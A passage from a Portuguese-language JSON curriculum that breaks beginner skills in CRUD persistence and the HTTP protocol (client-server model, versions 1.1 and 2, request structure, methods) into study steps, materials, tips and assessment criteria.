                                  "verification": "API responde corretamente a todas operações CRUD com status HTTP adequados.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Express.js",
                                    "Postman",
                                    "Código completo de persistência"
                                  ],
                                  "tips": "Separe responsabilidades: persistência só dados, serviço lógica de app.",
                                  "learningObjective": "Conectar persistência à arquitetura web em camadas.",
                                  "commonMistakes": [
                                    "Misturar lógica de negócios na persistência",
                                    "Expor detalhes do banco na API",
                                    "Ignorar CORS em testes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema de gerenciamento de blog, implemente um repositório para posts com CRUD: crie um post via POST /posts, liste via GET /posts, atualize título via PUT /posts/:id e delete via DELETE /posts/:id, usando Sequelize com PostgreSQL na camada de persistência.",
                              "finalVerifications": [
                                "Todas operações CRUD funcionam sem erros SQL.",
                                "Integração web retorna JSON correto com status HTTP apropriados.",
                                "Dados persistem corretamente após restart do app.",
                                "Tratamento de erros para casos inválidos (ex: ID inexistente).",
                                "Performance aceitável em queries com 100 registros simulados.",
                                "Código segue padrões de camada (sem SQL no controller)."
                              ],
                              "assessmentCriteria": [
                                "Uso de prepared statements ou ORM para prevenir SQL injection.",
                                "Separação clara de camadas (persistence, service, controller).",
                                "Tratamento completo de exceções e respostas HTTP.",
                                "Validações de dados em múltiplas camadas.",
                                "Código limpo, comentado e com testes unitários básicos.",
                                "Eficiência: índices em chaves estrangeiras e paginação em READ."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Modelagem relacional e normalização.",
                                "Programação: Padrões DAO/Repository e async/await.",
                                "Desenvolvimento Web: APIs REST e Express.js.",
                                "Segurança: Autenticação e prevenção de injeções.",
                                "Qualidade de Software: Testes e logging."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon, gerenciar catálogos de produtos com CRUD na persistência para criar itens, buscar por filtros, atualizar estoques e remover obsoletos, integrando com serviços de recomendação e front-end React."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.3",
                    "name": "Protocolo HTTP/HTTPS",
                    "description": "Protocolos essenciais para comunicação entre cliente e servidor na Internet.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.3.1",
                        "name": "Fundamentos do Protocolo HTTP",
                        "description": "Conceitos básicos do HTTP, incluindo sua definição, modelo cliente-servidor e características como stateless.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.1.1",
                            "name": "Definir o protocolo HTTP",
                            "description": "Explicar o HTTP como protocolo de camada de aplicação stateless, baseado em requisição-resposta, utilizado para comunicação entre navegadores (clientes) e servidores web na Internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Protocolos de Rede e o Modelo TCP/IP",
                                  "subSteps": [
                                    "Pesquise a definição de um protocolo de rede.",
                                    "Estude o modelo TCP/IP e identifique as camadas (Aplicação, Transporte, Internet, Enlace).",
                                    "Localize o HTTP na camada de Aplicação.",
                                    "Compare HTTP com outros protocolos da mesma camada, como FTP ou SMTP.",
                                    "Desenhe um diagrama simples do modelo TCP/IP destacando o HTTP."
                                  ],
                                  "verification": "Crie um diagrama do modelo TCP/IP com o HTTP marcado e explique sua posição em 1 parágrafo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Diagrama do modelo TCP/IP (imprimir ou digital)",
                                    "Artigo da Wikipedia sobre TCP/IP",
                                    "Vídeo introdutório sobre camadas de rede (5-10 min)"
                                  ],
                                  "tips": "Use analogias como 'protocolo é como regras de um jogo' para fixar o conceito.",
                                  "learningObjective": "Identificar a posição e o papel do HTTP no stack de protocolos TCP/IP.",
                                  "commonMistakes": [
                                    "Confundir camada de Aplicação com camada de Transporte (HTTP usa TCP na camada inferior)",
                                    "Achar que HTTP é o único protocolo da Internet"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Modelo Cliente-Servidor na Web",
                                  "subSteps": [
                                    "Defina os papéis de cliente (navegador) e servidor web.",
                                    "Descreva como o navegador inicia a comunicação com o servidor.",
                                    "Identifique exemplos de clientes (Chrome, Firefox) e servidores (Apache, Nginx).",
                                    "Simule uma interação básica: digitar URL → envio de pedido → resposta.",
                                    "Registre diferenças entre cliente e servidor em uma tabela."
                                  ],
                                  "verification": "Escreva um fluxograma simples da comunicação cliente-servidor usando HTTP.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Navegador web com aba aberta",
                                    "Papel e caneta para fluxograma",
                                    "Documentação MDN sobre cliente-servidor"
                                  ],
                                  "tips": "Pense no navegador como 'quem pede pizza' e servidor como 'pizzaria'.",
                                  "learningObjective": "Entender a comunicação assimétrica entre navegadores e servidores web via HTTP.",
                                  "commonMistakes": [
                                    "Invertir papéis: servidor pede ao cliente",
                                    "Ignorar que comunicação é iniciada pelo cliente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Mecanismo de Requisição-Resposta",
                                  "subSteps": [
                                    "Estude a estrutura básica de uma requisição HTTP (método, URL, headers, body).",
                                    "Descreva a resposta HTTP (status code, headers, body).",
                                    "Use DevTools do navegador para capturar uma requisição real (ex: google.com).",
                                    "Identifique métodos comuns (GET, POST) e status (200 OK, 404 Not Found).",
                                    "Anote um exemplo completo de request-response pair."
                                  ],
                                  "verification": "Capture e anote uma requisição-resposta real do navegador, explicando cada parte.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Navegador com DevTools (F12 > Network tab)",
                                    "Site de teste como httpbin.org",
                                    "Guia MDN sobre HTTP messages"
                                  ],
                                  "tips": "Ative 'Preserve log' no DevTools para não perder requisições em redirecionamentos.",
                                  "learningObjective": "Dominar o ciclo request-response como base do HTTP.",
                                  "commonMistakes": [
                                    "Confundir método GET com resposta",
                                    "Ignorar headers como parte essencial"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Investigar Características Stateless e Outras Propriedades",
                                  "subSteps": [
                                    "Defina 'stateless' e explique implicações (cada request é independente).",
                                    "Discuta como sessões são mantidas (cookies, tokens).",
                                    "Liste vantagens (escalabilidade) e desvantagens (necessidade de state management).",
                                    "Compare com protocolos stateful como FTP.",
                                    "Resuma todas as propriedades: texto-based, extensível, etc."
                                  ],
                                  "verification": "Escreva um parágrafo explicando por que HTTP é stateless e como isso afeta apps web.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo sobre HTTP stateless (MDN ou similar)",
                                    "Exemplos de cookies em DevTools",
                                    "Comparação stateless vs stateful"
                                  ],
                                  "tips": "Stateless significa 'sem memória': servidor esquece após cada resposta.",
                                  "learningObjective": "Explicar statelessness e seu impacto na arquitetura web.",
                                  "commonMistakes": [
                                    "Confundir stateless com inseguro",
                                    "Achar que cookies tornam HTTP stateful por padrão"
                                  ]
                                }
                              ],
                              "practicalExample": "Abra o DevTools (F12) no Chrome, acesse um site como example.com, filtre pela aba Network para ver requisições HTTP: observe o método GET na request, status 200 na response, headers como User-Agent, e body com HTML. Isso demonstra comunicação cliente-servidor request-response em ação.",
                              "finalVerifications": [
                                "Definir HTTP corretamente como protocolo de aplicação stateless request-response.",
                                "Explicar posição no TCP/IP e papéis cliente-servidor.",
                                "Identificar componentes de request-response (métodos, status, headers).",
                                "Descrever statelessness com exemplo de cookies.",
                                "Capturar e analisar uma requisição real no navegador.",
                                "Comparar HTTP com outro protocolo."
                              ],
                              "assessmentCriteria": [
                                "Precisão e uso correto de terminologia técnica (ex: stateless, request-response).",
                                "Capacidade de diagramar ou fluxogramar conceitos.",
                                "Análise prática via DevTools com exemplos concretos.",
                                "Explicação clara de implicações (escalabilidade do stateless).",
                                "Identificação de erros comuns e correções.",
                                "Integração de todos os elementos em uma definição coesa."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Modelo TCP/IP e camadas inferiores (TCP, IP).",
                                "Segurança da Informação: HTTPS como extensão segura do HTTP.",
                                "Desenvolvimento Web: Uso em APIs RESTful e fetch/AJAX.",
                                "Banco de Dados: Comunicação via HTTP em backends web.",
                                "Arquitetura de Software: Padrões cliente-servidor e microservices."
                              ],
                              "realWorldApplication": "O HTTP é a base de toda navegação web, carregamento de páginas, chamadas de APIs em apps como Instagram ou Netflix, e integrações em e-commerces (ex: enviar carrinho de compras via POST), permitindo bilhões de interações diárias escaláveis entre browsers e servidores globais."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.1.2",
                            "name": "Identificar o modelo cliente-servidor no HTTP",
                            "description": "Descrever o fluxo de comunicação onde o cliente envia uma requisição e o servidor responde, destacando a independência entre requisições devido à natureza stateless.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos fundamentais de cliente e servidor",
                                  "subSteps": [
                                    "Pesquise e defina 'cliente' no contexto de redes: um dispositivo ou software que inicia a comunicação solicitando serviços.",
                                    "Defina 'servidor': um sistema que aguarda e responde às solicitações dos clientes, fornecendo recursos ou dados.",
                                    "Identifique exemplos comuns: navegador web como cliente e servidor Apache/Nginx como servidor.",
                                    "Diferencie papéis: cliente é proativo (envia request), servidor é reativo (responde).",
                                    "Anote as características principais de cada um em um diagrama simples."
                                  ],
                                  "verification": "Escreva definições claras e um diagrama básico cliente-servidor; revise se distingue os papéis corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet para consulta em documentação HTTP (MDN Web Docs)",
                                    "Papel/caneta ou ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": "Use analogias como 'cliente = garçom pedindo prato' e 'servidor = cozinha preparando'.",
                                  "learningObjective": "Diferenciar precisamente os conceitos de cliente e servidor na arquitetura de rede.",
                                  "commonMistakes": [
                                    "Confundir cliente com hardware específico (ex: só PC), ignorar que ambos podem ser software"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear o fluxo básico de comunicação HTTP cliente-servidor",
                                  "subSteps": [
                                    "Descreva o passo 1: Cliente constrói e envia uma requisição HTTP (ex: método GET para uma URL).",
                                    "Passo 2: Requisição via TCP/IP chega ao servidor na porta 80/443.",
                                    "Passo 3: Servidor processa a requisição (consulta banco de dados, gera resposta).",
                                    "Passo 4: Servidor envia resposta HTTP (status code, headers, body).",
                                    "Passo 5: Cliente recebe e renderiza/processa a resposta."
                                  ],
                                  "verification": "Crie um fluxograma sequencial com setas request → response e labels para cada etapa.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação online (Lucidchart ou papel)",
                                    "Inspecionar requisição em navegador (DevTools)"
                                  ],
                                  "tips": "Abra DevTools no navegador (F12) e observe uma requisição real para visualizar o fluxo.",
                                  "learningObjective": "Descrever o fluxo unidirecional de request-response no modelo HTTP.",
                                  "commonMistakes": [
                                    "Omitir headers ou status codes na resposta",
                                    "Pensar em comunicação bidirecional contínua"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar a natureza stateless do protocolo HTTP",
                                  "subSteps": [
                                    "Defina 'stateless': cada requisição é independente, sem memória de interações anteriores.",
                                    "Exemplo: Cliente envia request1, servidor responde; request2 é tratada como nova, sem contexto de request1.",
                                    "Compare com stateful (ex: sessões TCP): HTTP não mantém estado entre requests.",
                                    "Discuta implicações: Necessidade de cookies/sessões para simular estado.",
                                    "Teste: Envie duas requests iguais em sequência e observe que servidor não 'lembra'."
                                  ],
                                  "verification": "Explique em 3-5 frases por que HTTP é stateless e dê um exemplo de impacto.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Navegador com DevTools",
                                    "Site de teste HTTP como httpbin.org"
                                  ],
                                  "tips": "Use httpbin.org/get para enviar requests e ver que cada uma é isolada.",
                                  "learningObjective": "Identificar e explicar a independência das requisições HTTP devido ao stateless.",
                                  "commonMistakes": [
                                    "Confundir stateless com sem conexão",
                                    "Achar que cookies tornam HTTP stateful nativamente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar o modelo em cenários reais e sintetizar",
                                  "subSteps": [
                                    "Analise um site real: Identifique cliente (seu browser) e servidor (do site).",
                                    "Rastreie uma request completa usando DevTools: método, URL, response.",
                                    "Simule falha: Desligue servidor local ou bloqueie request para ver dependência.",
                                    "Sintetize: Descreva o modelo completo em um parágrafo.",
                                    "Crie um quiz pessoal: 'O que acontece se cliente envia request sem estado?'"
                                  ],
                                  "verification": "Registre uma análise de request real com prints ou descrição detalhada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador Chrome/Firefox com DevTools",
                                    "Servidor local opcional (ex: Python http.server)"
                                  ],
                                  "tips": "Teste com curl no terminal: 'curl -v https://example.com' para ver fluxo raw.",
                                  "learningObjective": "Aplicar o modelo cliente-servidor HTTP em exemplos concretos.",
                                  "commonMistakes": [
                                    "Ignorar role reversa possível (ex: servidor como cliente em APIs)",
                                    "Não notar HTTPS como wrapper"
                                  ]
                                }
                              ],
                              "practicalExample": "Ao acessar 'https://www.example.com' no navegador (cliente), ele envia uma requisição GET independente; o servidor web responde com HTML/CSS/JS. Uma nova aba ou refresh inicia outro request stateless, sem memória da anterior, exigindo cookies para login persistente.",
                              "finalVerifications": [
                                "Diagramar corretamente o fluxo request-response com cliente e servidor rotulados.",
                                "Explicar stateless com exemplo de duas requests independentes.",
                                "Identificar cliente/servidor em uma captura de DevTools.",
                                "Diferenciar HTTP de protocolos stateful como WebSockets.",
                                "Descrever impacto de stateless em apps web (uso de tokens/sessões)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção cliente-servidor (proatividade vs. reatividade).",
                                "Correta representação do fluxo HTTP com request/response stateless.",
                                "Uso de exemplos reais e verificáveis (DevTools/curl).",
                                "Compreensão de implicações stateless (independência de requests).",
                                "Clareza e completude no diagrama ou descrição final.",
                                "Identificação de erros comuns evitados na explicação."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Camada de aplicação no modelo TCP/IP e OSI.",
                                "Desenvolvimento Web: Implementação de APIs REST stateless.",
                                "Segurança da Informação: HTTPS com TLS para criptografar request/response.",
                                "Banco de Dados: Servidores consultando DBs em responses.",
                                "Programação: Código cliente (fetch/Axios) e servidor (Express.js)."
                              ],
                              "realWorldApplication": "Todo site, app mobile ou API web usa esse modelo: apps como Instagram enviam requests stateless para feeds, e-commerces mantêm carrinho via cookies, garantindo escalabilidade global sem estado persistente por conexão."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.1.3",
                            "name": "Explicar versões do HTTP (1.1 e 2)",
                            "description": "Comparar HTTP/1.1 (persistente, pipelining) com HTTP/2 (multiplexação, compressão de cabeçalhos), focando em melhorias de performance.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar os fundamentos do HTTP/1.1",
                                  "subSteps": [
                                    "Estude o modelo request-response do HTTP/1.1.",
                                    "Identifique as conexões TCP persistentes (keep-alive).",
                                    "Analise limitações iniciais das conexões não-persistentes.",
                                    "Leia exemplos de cabeçalhos HTTP/1.1 em documentação oficial.",
                                    "Anote diferenças com versões anteriores como HTTP/1.0."
                                  ],
                                  "verification": "Liste corretamente pelo menos 3 características fundamentais do HTTP/1.1 em um resumo escrito.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre HTTP/1.1",
                                    "Ferramentas de desenvolvedor do navegador (DevTools)"
                                  ],
                                  "tips": "Use o Network tab no Chrome DevTools para observar requisições reais em HTTP/1.1.",
                                  "learningObjective": "Compreender as bases do HTTP/1.1, incluindo conexões persistentes.",
                                  "commonMistakes": [
                                    "Confundir persistência de conexão com reutilização de sockets TCP",
                                    "Ignorar o impacto no tempo de latência"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar features avançadas do HTTP/1.1: Pipelining e Persistência",
                                  "subSteps": [
                                    "Explique o conceito de pipelining: envio múltiplo de requisições sem esperar respostas.",
                                    "Descreva limitações do pipelining (bloqueio de cabeça de fila - HOL).",
                                    "Compare conexões persistentes vs não-persistentes com diagramas simples.",
                                    "Simule pipelining usando ferramentas como curl.",
                                    "Registre cenários onde pipelining falha devido a respostas fora de ordem."
                                  ],
                                  "verification": "Desenhe um diagrama comparando uma conexão persistente com e sem pipelining.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Comando curl no terminal",
                                    "Diagramas online (ex: draw.io)",
                                    "Artigo RFC 2616 (HTTP/1.1)"
                                  ],
                                  "tips": "Teste curl --http1.1 -N para ver persistência em ação.",
                                  "learningObjective": "Dominar pipelining e persistência no HTTP/1.1 e suas limitações de performance.",
                                  "commonMistakes": [
                                    "Achar que pipelining resolve todos os problemas de latência",
                                    "Não considerar o HOL blocking"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Introduzir o HTTP/2: Multiplexação e Compressão de Cabeçalhos",
                                  "subSteps": [
                                    "Estude multiplexação: múltiplos streams sobre uma única conexão TCP.",
                                    "Aprenda sobre HPACK: compressão de cabeçalhos para reduzir overhead.",
                                    "Compare frames HTTP/2 (HEADERS, DATA) com mensagens HTTP/1.1.",
                                    "Identifique server push como feature adicional.",
                                    "Use Wireshark para capturar tráfego HTTP/2."
                                  ],
                                  "verification": "Explique em 3 frases como a multiplexação elimina o HOL blocking do HTTP/1.1.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Wireshark para captura de pacotes",
                                    "Documentação HTTP/2 no MDN",
                                    "RFC 7540"
                                  ],
                                  "tips": "Ative HTTP/2 em sites como http2.pro para testes práticos.",
                                  "learningObjective": "Entender as principais inovações do HTTP/2 focadas em performance.",
                                  "commonMistakes": [
                                    "Confundir multiplexação com paralelismo de conexões",
                                    "Subestimar benefícios da compressão HPACK"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar HTTP/1.1 e HTTP/2 com foco em performance",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: latência, throughput, uso de banda.",
                                    "Meça diferenças em tempo de carregamento usando ferramentas.",
                                    "Discuta cenários onde HTTP/2 é superior (ex: mobile com alta latência).",
                                    "Analise trade-offs: complexidade vs ganhos.",
                                    "Resuma melhorias quantitativas (ex: 50% menos latência em multiplexação)."
                                  ],
                                  "verification": "Preencha uma tabela de comparação com pelo menos 5 métricas de performance.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramentas DevTools Network",
                                    "Sites de teste como http2.golang.org",
                                    "Planilha Google Sheets para tabela"
                                  ],
                                  "tips": "Compare o mesmo site em HTTP/1.1 e HTTP/2 alterando configurações do navegador.",
                                  "learningObjective": "Capacitar a explicar e quantificar melhorias de performance do HTTP/2 sobre 1.1.",
                                  "commonMistakes": [
                                    "Ignorar que HTTP/2 requer TLS na maioria dos casos",
                                    "Generalizar ganhos sem contexto de rede"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando as DevTools do Chrome, acesse um site com HTTP/2 (ex: google.com) e force HTTP/1.1 via extensão. Compare o tempo de carregamento de 10 recursos: observe como multiplexação no HTTP/2 permite streams paralelos, reduzindo o tempo total de ~2s para ~800ms.",
                              "finalVerifications": [
                                "Explicar corretamente a diferença entre pipelining (HTTP/1.1) e multiplexação (HTTP/2).",
                                "Descrever como HPACK reduz o tamanho dos cabeçalhos em 80-90%.",
                                "Identificar HOL blocking em HTTP/1.1 e sua solução no HTTP/2.",
                                "Listar 3 cenários reais onde HTTP/2 melhora performance.",
                                "Criar um diagrama de fluxo de requisições em cada versão.",
                                "Simular uma requisição com curl em ambas as versões."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na distinção de features (persistência vs multiplexação).",
                                "Capacidade de quantificar melhorias de performance com exemplos numéricos.",
                                "Uso correto de terminologia (HPACK, streams, frames).",
                                "Análise crítica de limitações e trade-offs.",
                                "Clareza na comunicação da comparação via diagramas ou tabelas.",
                                "Aplicação prática demonstrada em ferramentas reais."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Conceitos de TCP e latência de rede.",
                                "Desenvolvimento Web: Otimização de front-end e carregamento de assets.",
                                "Segurança da Informação: Integração com HTTPS/TLS no HTTP/2.",
                                "Engenharia de Software: Impacto em arquitetura de APIs e microservices."
                              ],
                              "realWorldApplication": "Sites como Netflix e Google usam HTTP/2 para multiplexar streams de vídeo e assets, reduzindo buffer time em 30-50% em conexões móveis lentas, melhorando retenção de usuários e escalabilidade de servidores."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.3.2",
                        "name": "Estrutura de Mensagens HTTP",
                        "description": "Análise detalhada das requisições e respostas HTTP, incluindo métodos, cabeçalhos e códigos de status.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.2.1",
                            "name": "Descrever a estrutura de uma requisição HTTP",
                            "description": "Detalhar componentes: linha de requisição (método, URI, versão), cabeçalhos (ex: Host, User-Agent) e corpo (para POST/PUT).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Linha de Requisição Inicial",
                                  "subSteps": [
                                    "Identificar o método HTTP (ex: GET, POST, PUT, DELETE).",
                                    "Explicar a URI (Uniform Resource Identifier), incluindo caminho e query parameters.",
                                    "Descrever a versão do protocolo HTTP (ex: HTTP/1.1, HTTP/2).",
                                    "Entender o formato geral: 'MÉTODO URI VERSÃO\\r\\n'.",
                                    "Analisar exemplos reais de linhas de requisição."
                                  ],
                                  "verification": "Construa manualmente uma linha de requisição simples e valide com ferramentas como curl.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação RFC 7230",
                                    "Ferramenta curl ou browser DevTools"
                                  ],
                                  "tips": "Sempre inclua \\r\\n no final da linha para separar do próximo componente.",
                                  "learningObjective": "Dominar os três componentes essenciais da linha inicial de uma requisição HTTP.",
                                  "commonMistakes": [
                                    "Confundir URI com URL completa",
                                    "Esquecer a versão do protocolo",
                                    "Usar espaços em vez de tabulação ou CRLF"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar os Cabeçalhos HTTP",
                                  "subSteps": [
                                    "Listar cabeçalhos obrigatórios como Host e User-Agent.",
                                    "Explicar cabeçalhos comuns: Content-Type, Content-Length, Authorization.",
                                    "Entender o formato: 'Cabeçalho: valor\\r\\n'.",
                                    "Diferenciar cabeçalhos de requisição de resposta.",
                                    "Praticar identificando cabeçalhos em uma requisição capturada."
                                  ],
                                  "verification": "Capture uma requisição no DevTools e liste 5 cabeçalhos com suas funções.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Browser DevTools (F12 > Network)",
                                    "Postman para simular requisições"
                                  ],
                                  "tips": "Cabeçalhos são case-insensitive, mas siga convenções maiúsculas.",
                                  "learningObjective": "Identificar e descrever o papel de pelo menos 8 cabeçalhos comuns em requisições HTTP.",
                                  "commonMistakes": [
                                    "Confundir cabeçalhos com corpo",
                                    "Ignorar cabeçalho Host obrigatório em HTTP/1.1",
                                    "Não terminar com \\r\\n vazio"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar o Corpo da Requisição",
                                  "subSteps": [
                                    "Explicar quando o corpo é usado (métodos POST, PUT, PATCH).",
                                    "Descrever formatos comuns: JSON, form-data, XML.",
                                    "Relacionar Content-Length ou Transfer-Encoding com o corpo.",
                                    "Diferenciar requisições sem corpo (GET, HEAD).",
                                    "Simular envio de corpo em uma ferramenta."
                                  ],
                                  "verification": "Envie uma requisição POST com corpo JSON via curl e verifique o tamanho.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "curl comando",
                                    "Editor de texto para JSON",
                                    "API teste como jsonplaceholder.typicode.com"
                                  ],
                                  "tips": "Para GET, o corpo deve ser vazio; use query params para dados.",
                                  "learningObjective": "Compreender o uso condicional e formatos do corpo em requisições HTTP.",
                                  "commonMistakes": [
                                    "Incluir corpo em GET",
                                    "Esquecer Content-Type",
                                    "Não codificar caracteres especiais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar a Estrutura Completa de uma Requisição HTTP",
                                  "subSteps": [
                                    "Montar uma requisição completa: linha + cabeçalhos + corpo + linha vazia.",
                                    "Comparar com resposta HTTP para diferenças.",
                                    "Analisar uma requisição real de uma aplicação web.",
                                    "Explicar separadores CRLF entre componentes.",
                                    "Testar variações (GET vs POST)."
                                  ],
                                  "verification": "Crie e envie uma requisição manual via telnet ou nc e confirme estrutura.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Netcat (nc) ou telnet",
                                    "Servidor HTTP local como httpie ou Python SimpleHTTPServer"
                                  ],
                                  "tips": "Use ferramentas como Wireshark para captura de pacotes reais.",
                                  "learningObjective": "Descrever verbalmente ou diagramaticamente a estrutura integral de uma requisição HTTP.",
                                  "commonMistakes": [
                                    "Omitir linha vazia após cabeçalhos",
                                    "Confundir ordem dos componentes",
                                    "Ignorar HTTPS wrapper"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando curl: 'curl -X POST http://jsonplaceholder.typicode.com/posts -H \"Content-Type: application/json\" -d \"{\\\"title\\\":\\\"foo\\\",\\\"body\\\":\\\"bar\\\"}\"' - analise a saída para identificar linha (POST /posts HTTP/1.1), cabeçalhos (Host, Content-Type, Content-Length) e corpo JSON.",
                              "finalVerifications": [
                                "Descreva corretamente a linha de requisição com método, URI e versão.",
                                "Liste e explique 5 cabeçalhos obrigatórios ou comuns.",
                                "Diferencie requisições com e sem corpo.",
                                "Monte uma requisição HTTP completa manualmente.",
                                "Identifique erros em uma requisição malformada.",
                                "Explique o papel dos separadores CRLF."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de todos os componentes (linha, cabeçalhos, corpo).",
                                "Completude: inclusão de exemplos reais e formatos.",
                                "Clareza na explicação de interdependências (ex: Content-Length com corpo).",
                                "Capacidade de análise prática via ferramentas.",
                                "Correção de erros comuns demonstrada.",
                                "Uso de terminologia técnica padrão (RFC-compliant)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Camada de Aplicação no modelo OSI/TCP-IP.",
                                "Programação Web: Integração com JavaScript fetch() ou bibliotecas como Axios.",
                                "Segurança da Informação: Cabeçalhos de autenticação e CORS.",
                                "Desenvolvimento de APIs: Design RESTful com métodos HTTP.",
                                "Banco de Dados: Requisições para endpoints de CRUD."
                              ],
                              "realWorldApplication": "Em desenvolvimento de aplicações web, entender a estrutura de requisições HTTP permite debugar erros de API (ex: 400 Bad Request por cabeçalho faltante), otimizar performance (compressão via cabeçalhos), integrar com serviços como AWS ou Stripe, e construir proxies ou middlewares personalizados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.1.3.2.2",
                            "name": "Listar e exemplificar métodos HTTP comuns",
                            "description": "Explicar GET (recuperar), POST (criar), PUT (atualizar), DELETE (remover), com exemplos de uso em aplicações web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos dos Métodos HTTP",
                                  "subSteps": [
                                    "Leia a definição de métodos HTTP como verbos que definem a ação a ser realizada em um recurso.",
                                    "Identifique o papel dos métodos no protocolo RESTful.",
                                    "Revise a estrutura geral de uma requisição HTTP (método, URL, headers, body).",
                                    "Assista a um vídeo introdutório sobre o ciclo de requisição-resposta HTTP.",
                                    "Anote as diferenças entre métodos idempotentes e não idempotentes."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando uma requisição HTTP com método genérico e explique verbalmente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação MDN Web Docs sobre HTTP methods, vídeo introdutório no YouTube (ex: 'HTTP Methods Explained')",
                                  "tips": "Use analogias como 'GET é como ler um livro da biblioteca, POST é como escrever um novo capítulo'.",
                                  "learningObjective": "Compreender o propósito fundamental dos métodos HTTP no contexto de aplicações web.",
                                  "commonMistakes": "Confundir métodos HTTP com URLs; lembrar que o método indica a ação, não o endpoint."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar os Métodos GET e POST em Detalhe",
                                  "subSteps": [
                                    "Analise GET: recuperar dados, idempotente, parâmetros na URL, sem body.",
                                    "Exemplo GET: acessar '/users?id=1' para listar um usuário.",
                                    "Analise POST: criar recursos, não idempotente, body com dados JSON.",
                                    "Exemplo POST: enviar {'name': 'João', 'email': 'joao@email.com'} para '/users'.",
                                    "Teste ambos em um playground online como ReqBin."
                                  ],
                                  "verification": "Execute requisições GET e POST em uma ferramenta e capture as respostas com status codes corretos (200 OK para GET, 201 Created para POST).",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramenta ReqBin ou Postman, exemplos de API pública como JSONPlaceholder",
                                  "tips": "Sempre verifique o Content-Type header para POST (application/json).",
                                  "learningObjective": "Diferenciar e exemplificar GET e POST com casos de uso precisos.",
                                  "commonMistakes": "Usar body em GET (inválido); enviar dados sensíveis em GET via URL."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar os Métodos PUT e DELETE em Detalhe",
                                  "subSteps": [
                                    "Analise PUT: atualizar ou criar recurso completo, idempotente, body com dados completos.",
                                    "Exemplo PUT: atualizar '/users/1' com {'name': 'João Atualizado'}.",
                                    "Analise DELETE: remover recurso, idempotente, sem body.",
                                    "Exemplo DELETE: deletar '/users/1' resultando em 204 No Content.",
